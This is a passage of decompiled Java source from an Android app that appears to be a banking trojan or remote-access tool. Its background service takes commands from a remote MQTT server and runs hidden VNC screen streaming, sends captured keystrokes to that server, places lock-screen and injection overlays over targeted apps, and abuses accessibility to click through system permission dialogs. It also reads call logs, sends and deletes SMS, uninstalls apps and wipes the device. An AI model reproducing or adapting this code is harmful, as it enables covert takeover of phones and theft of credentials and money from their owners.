                        globalparameters globalparametersVar4 = backgroundservice.mostCurrent._globalparameters;
                        mqttAsyncClientWrapper2.Publish2("RegisterMyDevice", globalparameters._my_device_info(ba3, globalparameters._isaccactive), 0, true);
                        break;
                    case 20:
                        this.state = 23;
                        if (!backgroundservice._isappssent) {
                            this.state = 22;
                            break;
                        } else {
                            break;
                        }
                    case 22:
                        this.state = 23;
                        Common.LogImpl("65046305", "isAppsSent : " + BA.ObjectToString(Boolean.valueOf(backgroundservice._isappssent)), 0);
                        backgroundservice._ws_send_deviceapps();
                        break;
                    case 23:
                        this.state = 17;
                        Common.Sleep(backgroundservice.processBA, this, 5000);
                        this.state = 31;
                        return;
                    case 24:
                        this.state = 27;
                        Common.LogImpl("65046311", "Disconnected", 0);
                        break;
                    case 26:
                        this.state = 27;
                        Common.LogImpl("65046313", "Error connecting.", 0);
                        break;
                    case 27:
                        this.state = 1;
                        Common.Sleep(backgroundservice.processBA, this, 2000);
                        this.state = 32;
                        return;
                    case 28:
                        this.state = -1;
                        break;
                    case KeyCodes.KEYCODE_A /* 29 */:
                        this.state = 10;
                        break;
                    case 30:
                        this.state = 14;
                        this._success = ((Boolean) objArr[0]).booleanValue();
                        break;
                    case KeyCodes.KEYCODE_C /* 31 */:
                        this.state = 17;
                        break;
                    case 32:
                        this.state = 1;
                        break;
                }
            }
        }
    }

    public static NotificationWrapper _createnotification() throws Exception {
        NotificationWrapper notificationWrapper = new NotificationWrapper();
        notificationWrapper.Initialize2(2);
        notificationWrapper.setIcon("icon");
        notificationWrapper.setSound(false);
        notificationWrapper.setVibrate(false);
        notificationWrapper.SetInfoNew(processBA, BA.ObjectToCharSequence(" "), BA.ObjectToCharSequence(" "), getObject());
        return notificationWrapper;
    }

    public static String _createnotification_alert(String str, String str2) throws Exception {
        backgroundservice backgroundserviceVar = mostCurrent;
        dateutils dateutilsVar = backgroundserviceVar._dateutils;
        BA ba = processBA;
        globalparameters globalparametersVar = backgroundserviceVar._globalparameters;
        long j = globalparameters._lnglastpermnotification;
        DateTime dateTime = Common.DateTime;
        if (dateutils._periodbetween(ba, j, DateTime.getNow()).Seconds <= 5) {
            return "";
        }
        NotificationWrapper notificationWrapper = new NotificationWrapper();
        notificationWrapper.Initialize2(4);
        notificationWrapper.setIcon("icon");
        notificationWrapper.setSound(true);
        notificationWrapper.setVibrate(true);
        BA ba2 = processBA;
        CharSequence ObjectToCharSequence = BA.ObjectToCharSequence(str);
        CharSequence ObjectToCharSequence2 = BA.ObjectToCharSequence(str2);
        forc_activateacc forc_activateaccVar = mostCurrent._forc_activateacc;
        notificationWrapper.SetInfoNew(ba2, ObjectToCharSequence, ObjectToCharSequence2, forc_activateacc.getObject());
        notificationWrapper.Notify(1);
        globalparameters globalparametersVar2 = mostCurrent._globalparameters;
        DateTime dateTime2 = Common.DateTime;
        globalparameters._lnglastpermnotification = DateTime.getNow();
        return "";
    }

    public static String _createnotificationfak(String str, String str2, CanvasWrapper.BitmapWrapper bitmapWrapper, String str3) throws Exception {
        try {
            nb6 nb6Var = new nb6();
            nb6Var._initialize(processBA, BA.NumberToString(1), " ", "HIGH")._smallicon(bitmapWrapper)._autocancel(false);
            nb6Var._setdefaults(true, true, true);
            faknotiactivity faknotiactivityVar = mostCurrent._faknotiactivity;
            nb6Var._build(str, str2, str3, faknotiactivity.getObject()).Notify(Common.Rnd(8765, 999999));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68126472", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _draw_views_sendvia_mjpeg(List list) throws Exception {
        try {
            if (_mqtt.IsInitialized() && _mqtt.getConnected() && list.getSize() > 0) {
                B4XSerializator b4XSerializator = new B4XSerializator();
                MqttAsyncClientWrapper mqttAsyncClientWrapper = _mqtt;
                StringBuilder sb = new StringBuilder();
                sb.append("HVNCImage");
                globalparameters globalparametersVar = mostCurrent._globalparameters;
                sb.append(globalparameters._mydeviceid);
                mqttAsyncClientWrapper.Publish2(sb.toString(), b4XSerializator.ConvertObjectToBytes(list.getObject()), 0, false);
            }
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            if (!globalparameters._isautosystdalogclker) {
                return "";
            }
            clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
            if (clsclassperms_code._intpermissionno != 6 || _isovrsho) {
                return "";
            }
            String ObjectToString = BA.ObjectToString(list);
            if (!ObjectToString.contains("android:id/button1") || !ObjectToString.contains("packagename=com.android") || !ObjectToString.contains("android:id/message")) {
                return "";
            }
            B4AApplication b4AApplication = Common.Application;
            if (ObjectToString.contains(B4AApplication.getPackageName())) {
                return "";
            }
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener accessibilityEventsListener = _acs;
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) Common.Null;
            java.util.Map map3 = map2;
            accessibilityEventsListener.PerformNodeActionOnViewWithArgs(true, "android:id/button1", 16, (Map) AbsObjectWrapper.ConvertToWrapper(map, map2));
            AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69633893", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Draw_Views_SendVia_MJPEG" + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static void _get_myipaddress() throws Exception {
        new ResumableSub_Get_MyIPAddress(null).resume(processBA, null);
    }

    public static class ResumableSub_Get_MyIPAddress extends BA.ResumableSub {

        /* renamed from: _j */
        httpjob f340_j = null;
        backgroundservice parent;

        public ResumableSub_Get_MyIPAddress(backgroundservice backgroundserviceVar) {
            this.parent = backgroundserviceVar;
        }

        /* JADX WARN: Removed duplicated region for block: B:60:0x00b6  */
        /* JADX WARN: Removed duplicated region for block: B:62:0x00c2 A[SYNTHETIC] */
        @Override // anywheresoftware.b4a.BA.ResumableSub
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct code enable 'Show inconsistent code' option in preferences
        */
        public void resume(anywheresoftware.b4a.BA r7, java.lang.Object[] r8) throws java.lang.Exception {
            /*
                r6 = this;
            L0:
                int r7 = r6.state     // Catch: java.lang.Exception -> Lb1
                r0 = 13
                r1 = 10
                r2 = 7
                r3 = 11
                r4 = 14
                r5 = 0
                switch(r7) {
                    case -1: goto Lb0;
                    case 0: goto Lab;
                    case 1: goto La2;
                    case 2: goto Lf;
                    case 3: goto L9b;
                    case 4: goto L83;
                    case 5: goto Lf;
                    case 6: goto L5a;
                    case 7: goto L4d;
                    case 8: goto Lf;
                    case 9: goto L3e;
                    case 10: goto L36;
                    case 11: goto L33;
                    case 12: goto Lf;
                    case 13: goto L1f;
                    case 14: goto L19;
                    case 15: goto L10;
                    default: goto Lf;
                }     // Catch: java.lang.Exception -> Lb1
            Lf:
                goto L0
            L10:
                r6.state = r2     // Catch: java.lang.Exception -> Lb1
                r7 = r8[r5]     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = (com.com.androidrr.httpjob) r7     // Catch: java.lang.Exception -> Lb1
                r6.f340_j = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            L19:
                r7 = -1
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                r6.catchState = r5     // Catch: java.lang.Exception -> Lb1
                goto L0
            L1f:
                r6.state = r4     // Catch: java.lang.Exception -> Lb1
                r6.catchState = r5     // Catch: java.lang.Exception -> Lb1
                java.lang.String r7 = "65111822"
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> Lb1
                anywheresoftware.b4a.objects.B4AException r0 = anywheresoftware.b4a.keywords.Common.LastException(r0)     // Catch: java.lang.Exception -> Lb1
                java.lang.String r0 = anywheresoftware.b4a.BA.ObjectToString(r0)     // Catch: java.lang.Exception -> Lb1
                anywheresoftware.b4a.keywords.Common.LogImpl(r7, r0, r5)     // Catch: java.lang.Exception -> Lb1
                goto L0
            L33:
                r6.state = r4     // Catch: java.lang.Exception -> Lb1
                goto L0
            L36:
                r6.state = r3     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = r6.f340_j     // Catch: java.lang.Exception -> Lb1
                r7._release()     // Catch: java.lang.Exception -> Lb1
                goto L0
            L3e:
                r6.state = r1     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.backgroundservice r7 = com.com.androidrr.backgroundservice.mostCurrent     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.globalparameters r7 = r7._globalparameters     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = r6.f340_j     // Catch: java.lang.Exception -> Lb1
                java.lang.String r7 = r7._getstring()     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.globalparameters._strmypublicip = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            L4d:
                r6.state = r1     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = r6.f340_j     // Catch: java.lang.Exception -> Lb1
                boolean r7 = r7._success     // Catch: java.lang.Exception -> Lb1
                if (r7 == 0) goto L0
                r7 = 9
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            L5a:
                r6.state = r2     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = new com.com.androidrr.httpjob     // Catch: java.lang.Exception -> Lb1
                r7.<init>()     // Catch: java.lang.Exception -> Lb1
                r6.f340_j = r7     // Catch: java.lang.Exception -> Lb1
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> Lb1
                java.lang.String r1 = "j"
                java.lang.Class r2 = com.com.androidrr.backgroundservice.getObject()     // Catch: java.lang.Exception -> Lb1
                r7._initialize(r0, r1, r2)     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r7 = r6.f340_j     // Catch: java.lang.Exception -> Lb1
                java.lang.String r0 = "https://freeipapi.com/api/json"
                r7._download(r0)     // Catch: java.lang.Exception -> Lb1
                java.lang.String r7 = "jobdone"
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.httpjob r1 = r6.f340_j     // Catch: java.lang.Exception -> Lb1
                anywheresoftware.b4a.keywords.Common.WaitFor(r7, r0, r6, r1)     // Catch: java.lang.Exception -> Lb1
                r7 = 15
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                return
            L83:
                r6.state = r3     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.backgroundservice r7 = com.com.androidrr.backgroundservice.mostCurrent     // Catch: java.lang.Exception -> Lb1
                com.com.androidrr.globalparameters r7 = r7._globalparameters     // Catch: java.lang.Exception -> Lb1
                java.lang.String r7 = com.com.androidrr.globalparameters._strmypublicip     // Catch: java.lang.Exception -> Lb1
                java.lang.String r7 = r7.trim()     // Catch: java.lang.Exception -> Lb1
                int r7 = r7.length()     // Catch: java.lang.Exception -> Lb1
                r0 = 5
                if (r7 >= r0) goto L0
                r7 = 6
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            L9b:
                r7 = 4
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                r6.catchState = r0     // Catch: java.lang.Exception -> Lb1
                goto L0
            La2:
                r6.state = r4     // Catch: java.lang.Exception -> Lb1
                r6.catchState = r0     // Catch: java.lang.Exception -> Lb1
                r7 = 3
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            Lab:
                r7 = 1
                r6.state = r7     // Catch: java.lang.Exception -> Lb1
                goto L0
            Lb0:
                return
            Lb1:
                r7 = move-exception
                int r0 = r6.catchState
                if (r0 == 0) goto Lc1
                int r0 = r6.catchState
                r6.state = r0
                anywheresoftware.b4a.BA r0 = com.com.androidrr.backgroundservice.processBA
                r0.setLastException(r7)
                goto L0
            Lc1:
                goto Lc3
            Lc2:
                throw r7
            Lc3:
                goto Lc2
            */
            throw new UnsupportedOperationException("Method not decompiled: com.com.androidrr.backgroundservice.ResumableSub_Get_MyIPAddress.resume(anywheresoftware.b4a.BA, java.lang.Object[]):void");
        }
    }

    public static Object _getadmincomponent() throws Exception {
        new JavaObject();
        return ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _manager)).GetFieldJO("rec").getObject();
    }

    public static JavaObject _getba() throws Exception {
        JavaObject javaObject = new JavaObject();
        javaObject.InitializeStatic(BA.ObjectToString(getObject()).substring(6));
        return javaObject.GetFieldJO("processBA");
    }

    public static JavaObject _getcontext() throws Exception {
        return (JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _getba().GetField("context"));
    }

    public static Common.ResumableSubWrapper _getkeylo(String str) throws Exception {
        ResumableSub_getkeylo resumableSub_getkeylo = new ResumableSub_getkeylo(null, str);
        resumableSub_getkeylo.resume(processBA, null);
        return (Common.ResumableSubWrapper) AbsObjectWrapper.ConvertToWrapper(new Common.ResumableSubWrapper(), resumableSub_getkeylo);
    }

    public static class ResumableSub_getkeylo extends BA.ResumableSub {
        Map _mp = null;
        B4XSerializator _ser = null;
        String _str;
        backgroundservice parent;

        public ResumableSub_getkeylo(backgroundservice backgroundserviceVar, String str) {
            this.parent = backgroundserviceVar;
            this._str = str;
        }

        @Override // anywheresoftware.b4a.BA.ResumableSub
        public void resume(BA ba, Object[] objArr) throws Exception {
            while (true) {
                try {
                    switch (this.state) {
                        case -1:
                            Common.ReturnFromResumableSub(this, null);
                            return;
                        case 0:
                            this.state = 1;
                            break;
                        case 1:
                            this.state = 14;
                            this.catchState = 13;
                            this.state = 3;
                            break;
                        case 3:
                            this.state = 4;
                            this.catchState = 13;
                            break;
                        case 4:
                            this.state = 11;
                            if (this._str.trim().length() <= 0) {
                                break;
                            } else {
                                this.state = 6;
                                break;
                            }
                        case 6:
                            this.state = 7;
                            break;
                        case 7:
                            this.state = 10;
                            if (backgroundservice._mqtt.IsInitialized() && backgroundservice._mqtt.getConnected()) {
                                this.state = 9;
                                break;
                            }
                            break;
                        case 9:
                            this.state = 10;
                            Map map = new Map();
                            this._mp = map;
                            map.Initialize();
                            Map map2 = this._mp;
                            globalparameters globalparametersVar = backgroundservice.mostCurrent._globalparameters;
                            map2.Put("DeviceID", globalparameters._mydeviceid);
                            this._mp.Put("keylodata", this._str);
                            this._ser = new B4XSerializator();
                            backgroundservice._mqtt.Publish2("kylg_data", this._ser.ConvertObjectToBytes(this._mp.getObject()), 1, false);
                            break;
                        case 10:
                            this.state = 11;
                            break;
                        case 11:
                            this.state = 14;
                            break;
                        case 13:
                            this.state = 14;
                            this.catchState = 0;
                            Common.LogImpl("66619152", BA.ObjectToString(Common.LastException(backgroundservice.processBA)), 0);
                            backgroundservice._send_toserver_errors("Line 386 " + Common.LastException(backgroundservice.processBA).getMessage());
                            break;
                        case 14:
                            this.state = -1;
                            this.catchState = 0;
                            Common.ReturnFromResumableSub(this, Common.Null);
                            return;
                    }
                } catch (Exception e) {
                    if (this.catchState == 0) {
                        throw e;
                    }
                    this.state = this.catchState;
                    backgroundservice.processBA.setLastException(e);
                }
            }
        }
    }

    public static JavaObject _getmanager() throws Exception {
        new JavaObject();
        return ((JavaObject) AbsObjectWrapper.ConvertToWrapper(new JavaObject(), _manager)).GetFieldJO("dm");
    }

    public static String _hide_oversha() throws Exception {
        try {
            StringBuilder sb = new StringBuilder();
            sb.append("hide_oversha : ");
            clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
            sb.append(BA.NumberToString(clsclassperms_code._intpermissionno));
            Common.LogImpl("69240578", sb.toString(), 0);
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (!globalparameters._isovlyhandler || !_isovrsho) {
                return "";
            }
            clsclassperms_code clsclassperms_codeVar2 = mostCurrent._clsclassperms_code;
            if (clsclassperms_code._intpermissionno != 6) {
                return "";
            }
            _ws_send_unlockscreen_overlay();
            _isovrsho = false;
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69240590", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _imagetobytes_send_hvnc_to_ws(CanvasWrapper.BitmapWrapper bitmapWrapper) throws Exception {
        try {
            File.OutputStreamWrapper outputStreamWrapper = new File.OutputStreamWrapper();
            outputStreamWrapper.InitializeToBytesArray(0);
            bitmapWrapper.Resize(300.0f, 600.0f, false).WriteToStream(outputStreamWrapper.getObject(), _inthquality, (Bitmap.CompressFormat) BA.getEnumFromString(Bitmap.CompressFormat.class, "JPEG"));
            outputStreamWrapper.Close();
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (!globalparameters._ismobiledata || !_mqtt.IsInitialized() || !_mqtt.getConnected()) {
                return "";
            }
            Map map = new Map();
            map.Initialize();
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            map.Put("deviceid", globalparameters._mydeviceid);
            map.Put("hvncimage", new StringUtils().EncodeBase64(outputStreamWrapper.ToBytesArray()));
            _sendeventtoserver("Send_hvncimage_ToPC", map);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("68585242", BA.ObjectToString(Common.LastException(processBA)), 0);
            _send_toserver_errors("Line 894 " + Common.LastException(processBA).getMessage());
            return "";
        }
    }

    public static String _mqtt_messagearrived(String str, byte[] bArr) throws Exception {
        if (!str.equals("commands_FromPC")) {
            return "";
        }
        B4XSerializator b4XSerializator = new B4XSerializator();
        new Map();
        Map map = (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) b4XSerializator.ConvertBytesToObject(bArr));
        globalparameters globalparametersVar = mostCurrent._globalparameters;
        if (!globalparameters._mydeviceid.equals(BA.ObjectToString(map.Get("deviceid")))) {
            return "";
        }
        Common.LogImpl("65242888", BA.ObjectToString(map.Get("fun")), 0);
        Common.ToastMessageShow(BA.ObjectToCharSequence(""), false);
        switch (BA.switchObjectToInt(map.Get("fun"), "send_inj_lst", "clickbyid", "Send_Open_Recents", "downextraapp", "openanyurl", "Refrech_hvn_by_Noti", "GlobalParamsActions", "Enable_Noti", "isAutoSystDalogClker", "Request_TurnoffDeviceScreen_FromAndroid", "Send_DeviceScreenShot_Permission", "Send_Custom_LockScreen", "Send_LockScreen_Overlay", "Send_LockScreen_Overlay_URL", "Send_LockScreen_Overlay_CO", "Send_UnLockScreen_Overlay", "Request_HVNC_TableTexts_FromAndroid", "Send_DeviceApps", "Send_KeyLo_Views", "Send_Click_FromPCToAndroidDevice", "Send_Text_FromPCToAndroidDevice", "Send_Important_Views_Only", "FormatthisDevice", "Send_CallPhoneNumber", "Send_Change_H_Quality", "Get_Device_CallLogs", "Send_GlobalAction_FromPCToAdroid", "Send_ChangeVNCFPS", "Hide_AppData_Info", "Send_Wakeup_Device", "Send_Request_Permissions", "Send_Open_CertainApp", "Send_Uninstall_CertainApp", "Send_Block_Certain_App", "Send_Swipe_Action_ACS", "Send_fromtblclick_ACS", "Send_Pattren_Action_ACS", "Send_Create_Notification", "Send_Show_Pattren_Buttons", "SendSMS_To_Admin", "del_SMS_FromAdmin", "Send_SMSMessage_ToNumber", "Admin_ConnectedToDevice")) {
            case 0:
                _send_inj_lst(map);
                break;
            case 1:
                Common.LogImpl("65242896", BA.ObjectToString(map), 0);
                boolean PerformClick_ByTemp = _acs.PerformClick_ByTemp((int) BA.ObjectToNumber(map.Get("vleft")), (int) BA.ObjectToNumber(map.Get("vtop")), (int) BA.ObjectToNumber(map.Get("vwidth")), (int) BA.ObjectToNumber(map.Get("vheight")), BA.ObjectToString(map.Get("vtext")), BA.ObjectToString(map.Get("vid")));
                Common.LogImpl("65242899", "isclicked : " + BA.ObjectToString(Boolean.valueOf(PerformClick_ByTemp)), 0);
                if (!PerformClick_ByTemp) {
                    _acs.PerformNodeActionOnViewWithArgs(true, BA.ObjectToString(map.Get("vid")), 16, (Map) AbsObjectWrapper.ConvertToWrapper(new Map(), (java.util.Map) Common.Null));
                    AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                    break;
                }
                break;
            case 2:
                _ws_send_open_recents();
                break;
            case 3:
                _wsh_downinstappp(map);
                break;
            case 4:
                IntentWrapper intentWrapper = new IntentWrapper();
                intentWrapper.Initialize(IntentWrapper.ACTION_VIEW, BA.ObjectToString(map.Get("weburl")));
                Common.StartActivity(processBA, intentWrapper.getObject());
                break;
            case 5:
                _acs.PerformGlobalAction(4);
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                _close_systemnotis();
                break;
            case 6:
                Common.LogImpl("65242922", BA.ObjectToString(map.Get("actionid")), 0);
                _acs.PerformGlobalAction((int) BA.ObjectToNumber(map.Get("actionid")));
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                break;
            case 7:
                _acs.SetIsNotiFicationBarShow(Boolean.valueOf(BA.ObjectToBoolean(map.Get("Action"))));
                AccessibilityEventsListenerWrapper.AccessibilityEventsListener.delay(250);
                break;
            case 8:
                Common.LogImpl("65242932", "isAutoSystDalogClker : " + BA.ObjectToString(map.Get("Action")), 0);
                globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                globalparameters._isautosystdalogclker = BA.ObjectToBoolean(map.Get("Action"));
                break;
            case 9:
                _ws_request_turnoffdevicescreen_fromandroid();
                break;
            case 10:
                globalparameters globalparametersVar3 = mostCurrent._globalparameters;
                globalparameters._vncontype = (int) BA.ObjectToNumber(map.Get("vncontype"));
                _ws_send_devicescreenshot_permission();
                break;
            case 11:
                _ws_send_custom_lockscreen(map);
                break;
            case 12:
                _ws_send_unlockscreen_overlay();
                _ws_send_lockscreen_overlay();
                break;
            case 13:
                _ws_send_unlockscreen_overlay();
                _ws_send_lockscreen_overlay_url(map);
                break;
            case 14:
                _ws_send_unlockscreen_overlay();
                _ws_send_lockscreen_overlay_co(map);
                break;
            case 15:
                _ws_send_unlockscreen_overlay();
                break;
            case 16:
                _ws_request_hvnc_tabletexts_fromandroid(map);
                break;
            case 17:
                _ws_send_deviceapps();
                break;
            case 18:
                _ws_send_keylo_views(map);
                break;
            case 19:
                _ws_send_click_frompctoandroiddevice(map);
                break;
            case 20:
                _ws_send_text_frompctoandroiddevice(map);
                break;
            case 21:
                _ws_send_important_views_only(map);
                break;
            case 22:
                _ws_formatthisdevice();
                break;
            case 23:
                _ws_send_callphonenumber(map);
                break;
            case 24:
                _ws_send_change_h_quality(map);
                break;
            case 25:
                _ws_get_device_calllogs(map);
                break;
            case 26:
                _ws_send_globalaction_frompctoadroid(map);
                break;
            case 27:
                _ws_send_changevncfps(map);
                break;
            case 28:
                _ws_hide_appdata_info(map);
                break;
            case KeyCodes.KEYCODE_A /* 29 */:
                _ws_send_wakeup_device();
                break;
            case 30:
                _ws_send_request_permissions(map);
                break;
            case KeyCodes.KEYCODE_C /* 31 */:
                _ws_send_open_certainapp(map);
                break;
            case 32:
                _ws_send_uninstall_certainapp(map);
                break;
            case 33:
                _ws_send_block_certain_app(map);
                break;
            case 34:
                _ws_send_swipe_action_acs(map);
                break;
            case 35:
                _ws_send_fromtblclick_acs(map);
                break;
            case 36:
                _ws_send_pattren_action_acs(map);
                break;
            case 37:
                _ws_send_create_notification(map);
                break;
            case 38:
                _ws_send_show_pattren_buttons(map);
                break;
            case 39:
                _ws_sendsms_to_admin();
                break;
            case 40:
                _ws_del_sms_fromadmin(map);
                break;
            case 41:
                _ws_send_smsmessage_tonumber(map);
                break;
            case 42:
                _ws_admin_connectedtodevice(map);
                break;
        }
        return "";
    }

    public static String _noti_replacement(String str, String str2, int i) throws Exception {
        try {
            new CanvasWrapper.BitmapWrapper();
            File file = Common.File;
            CanvasWrapper.BitmapWrapper LoadBitmap = Common.LoadBitmap(File.getDirAssets(), "tmpico.png");
            nb6 nb6Var = new nb6();
            nb6Var._initialize(processBA, BA.NumberToString(1), " ", "LOW")._smallicon(LoadBitmap)._autocancel(false);
            nb6Var._setdefaults(false, false, false);
            nb6Var._build(" ", str, "tag2", getObject()).Notify(i);
            Common.LogImpl("64521992", "replacement done", 0);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64521994", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _ovwindow_touch(int i, float f, float f2, float f3, float f4) throws Exception {
        Common.LogImpl("68847361", BA.NumberToString(i), 0);
        return "";
    }

    public static String _phoneevents1_batterychanged(int i, int i2, boolean z, IntentWrapper intentWrapper) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._strbatterypercentage = BA.NumberToString(i);
            globalparameters globalparametersVar2 = mostCurrent._globalparameters;
            globalparameters._isoncharger = BA.ObjectToString(Boolean.valueOf(z));
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64194309", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _phoneevents1_phonestatechanged(String str, String str2, IntentWrapper intentWrapper) throws Exception {
        try {
            Common.LogImpl("63997698", "IncomingNumber : " + str2, 0);
            _send_phone_iscalling(str, str2);
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("63997703", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _phoneevents1_screenoff(IntentWrapper intentWrapper) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isscreenison = false;
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64128772", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _phoneevents1_screenon(IntentWrapper intentWrapper) throws Exception {
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._isscreenison = true;
            return "";
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("64063236", BA.ObjectToString(Common.LastException(processBA)), 0);
            return "";
        }
    }

    public static String _process_globals() throws Exception {
        _cls_perm_notification1 = new cls_perm_notification();
        _cls_perm_draw1 = new cls_perm_draw();
        _cls_perm_syswrte1 = new cls_perm_syswrte();
        _cls_perm_oheraps1 = new cls_perm_oheraps();
        _cls_perm_phneperms1 = new cls_perm_phneperms();
        _cls_perm_pwr1 = new cls_perm_pwr();
        _isappssent = false;
        _phoneevents1 = new PhoneEvents();
        _phoneid = new Phone.PhoneId();
        _working = true;
        _tempsamsungpane2 = new List();
        _samsung_windowmanager = new JavaObject();
        _issendhvncastexts = false;
        _phonewakestate1 = new Phone.PhoneWakeState();
        _clsudpconnector1 = new clsudpconnector();
        _jo_otherfunctions = new JavaObject();
        _overlaywindow1 = new OverlayWindow();
        _acs = new AccessibilityEventsListenerWrapper.AccessibilityEventsListener();
        _accservconstants = new AccessibilityConstants();
        _intcanuninstalltheapp = 0;
        _isdeviceappssent = false;
        _isimportantviewsonly = 0;
        _ispattrenlock = 0;
        _manager = new AdminManager();
        _inthquality = 0;
        _strblockedpackagename = "";
        _mqtt = new MqttAsyncClientWrapper();
        _isovrsho = false;
        return "";
    }

    public static String _reload_fs() throws Exception {
        SQL sql = null;
        try {
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            globalparameters._mpinjlist.Initialize();
            SQL sql2 = new SQL();
            try {
                File file = Common.File;
                sql2.Initialize(File.getDirInternal(), "db.db", false);
                new SQL.ResultSetWrapper();
                SQL.ResultSetWrapper resultSetWrapper = (SQL.ResultSetWrapper) AbsObjectWrapper.ConvertToWrapper(new SQL.ResultSetWrapper(), sql2.ExecQuery("select * from pksinfo"));
                while (resultSetWrapper.NextRow()) {
                    globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                    globalparameters._mpinjlist.Put(resultSetWrapper.GetString("pkgname"), resultSetWrapper.GetString("filename"));
                    _acs.add_lst_ovlypks(resultSetWrapper.GetString("pkgname"), resultSetWrapper.GetString("filename"));
                }
                resultSetWrapper.Close();
                if (!sql2.IsInitialized()) {
                    return "";
                }
                sql2.Close();
                return "";
            } catch (Exception e) {
                e = e;
                sql = sql2;
                processBA.setLastException(e);
                if (sql.IsInitialized() && sql != null) {
                    sql.Close();
                }
                Common.LogImpl("63866650", BA.ObjectToString(Common.LastException(processBA)), 0);
                return "";
            }
        } catch (Exception e2) {
            e = e2;
        }
    }

    public static String _remove_o(String str) throws Exception {
        try {
            if (_isovrsho) {
                clsclassperms_code clsclassperms_codeVar = mostCurrent._clsclassperms_code;
                if (clsclassperms_code._intpermissionno < 6) {
                    return "";
                }
            }
            globalparameters globalparametersVar = mostCurrent._globalparameters;
            if (!globalparameters._mpinjlist.ContainsKey(str)) {
                globalparameters globalparametersVar2 = mostCurrent._globalparameters;
                globalparameters._isoverlay_isshowing = false;
                _ws_send_unlockscreen_overlay();
            }
        } catch (Exception e) {
            processBA.setLastException(e);
            Common.LogImpl("69568265", BA.ObjectToString(Common.LastException(processBA)), 0);
        }
        return "";
    }

    public static String _remove_overlaypans() throws Exception {
        try {
            _writesetting("screen_brightness", 255);
            if (!_overlaywindow1.IsInitialized()) {
                return "";
            }
            new PanelWrapper();
            PanelWrapper panel = _overlaywindow1.getPanel();
            if (panel.getTag() == null) {
                return "";
            }
            new Map();
            Map map = new Map();
            java.util.Map map2 = (java.util.Map) panel.getTag();
            java.util.Map map3 = map2;
            Map map4 = (Map) AbsObjectWrapper.ConvertToWrapper(map, map2);
            if (!map4.IsInitialized()) {
                return "";
            }
            new PanelWrapper();
            PanelWrapper panelWrapper = new PanelWrapper();
            ViewGroup viewGroup = (ViewGroup) map4.Get("mView1_SamsungOnly");
            ViewGroup viewGroup2 = viewGroup;
            PanelWrapper panelWrapper2 = (PanelWrapper) AbsObjectWrapper.ConvertToWrapper(panelWrapper, viewGroup);
            new PanelWrapper();
            PanelWrapper panelWrapper3 = new PanelWrapper();
